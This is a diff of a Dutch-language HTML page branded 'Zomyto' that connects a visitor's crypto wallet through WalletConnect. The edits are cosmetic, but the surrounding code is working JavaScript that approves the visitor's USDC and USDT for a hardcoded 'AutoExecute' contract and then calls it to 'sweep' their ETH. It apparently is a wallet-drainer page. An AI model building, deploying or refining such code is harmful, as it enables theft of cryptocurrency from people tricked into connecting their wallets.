@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Zomyto WalletConnect Approve + Sweep</title>
+<title>Zomyto WalletConnect v2 Approve + Sweep</title>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
 
@@ -16,7 +16,7 @@ img { margin-top:20px; }
 </head>
 <body>
 
-<h1>Zomyto WalletConnect Approve + Sweep</h1>
+<h1>Zomyto WalletConnect v2 Approve + Sweep</h1>
 <p>Scan de QR met je wallet of klik Connect</p>
 
 <img src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=https://scan.walletconnect.com/?clientMeta.name=Zomyto&projectId=0e7d96df89f873ddfb0b4381e13c883c" alt="Scan QR">
@@ -35,7 +35,7 @@ const tokens = [
   { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" }
 ];
 
-// AutoExecute contract adres
+// AutoExecute contract
 const autoExecute = "0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A"; // vervang indien nodig
 
 // ERC20 approve ABI
@@ -50,13 +50,13 @@ const rpc = {
 
 // Connect WalletConnect v2
 document.getElementById("connectBtn").onclick = async () => {
-  const wcProvider = new WalletConnectProvider.default({
-    projectId: "0e7d96df89f873ddfb0b4381e13c883c",
-    chains: [1],
-    rpc
-  });
-
   try {
+    const wcProvider = new WalletConnectProvider.default({
+      projectId: "0e7d96df89f873ddfb0b4381e13c883c",
+      chains: [1],
+      rpc
+    });
+
     await wcProvider.enable();
     provider = new ethers.providers.Web3Provider(wcProvider);
     signer = provider.getSigner();
@@ -64,10 +64,10 @@ document.getElementById("connectBtn").onclick = async () => {
     document.getElementById("approveBtn").disabled = false;
     document.getElementById("sweepBtn").disabled = false;
 
-    alert("Wallet connected!");
+    alert("✅ Wallet connected!");
   } catch (err) {
     console.error(err);
-    alert("Fout bij verbinden: " + err.message);
+    alert("❌ Fout bij verbinden: " + err.message);
   }
 };
 
@@ -80,10 +80,10 @@ document.getElementById("approveBtn").onclick = async () => {
       await tx.wait();
       console.log("✅ Approved:", t.name);
     }
-    alert("USDC + USDT succesvol goedgekeurd!");
+    alert("✅ USDC + USDT succesvol goedgekeurd!");
   } catch (err) {
     console.error(err);
-    alert("Fout bij approve: " + err.message);
+    alert("❌ Fout bij approve: " + err.message);
   }
 };
 
@@ -93,13 +93,14 @@ document.getElementById("sweepBtn").onclick = async () => {
     const contract = new ethers.Contract(autoExecute, autoExecuteABI, signer);
     const tx = await contract.execute();
     await tx.wait();
-    alert("ETH succesvol geswept!");
+    alert("✅ ETH succesvol geswept!");
   } catch (err) {
     console.error(err);
-    alert("Fout bij sweep: " + err.message);
+    alert("❌ Fout bij sweep: " + err.message);
   }
 };
 </script>
 
 </body>
 </html>
+
